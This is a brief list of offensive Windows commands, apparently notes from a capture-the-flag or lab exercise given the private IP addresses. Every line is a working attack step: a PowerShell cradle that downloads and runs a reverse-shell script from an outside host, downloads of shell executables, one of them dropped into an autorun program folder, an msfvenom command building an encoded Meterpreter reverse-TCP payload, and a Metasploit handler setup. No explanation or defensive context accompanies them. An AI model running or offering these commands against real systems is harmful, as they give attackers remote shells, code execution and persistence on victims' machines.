powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.239.155:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.239.155 -Port 8001

powershell -c "Invoke-WebRequest -Uri 'http://10.10.200.223:8000/program.exe' -OutFILE 'C:\Program Files\Autorun Program\program.exe'"

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.20.231:8001/shell-.exe','shell.exe')"
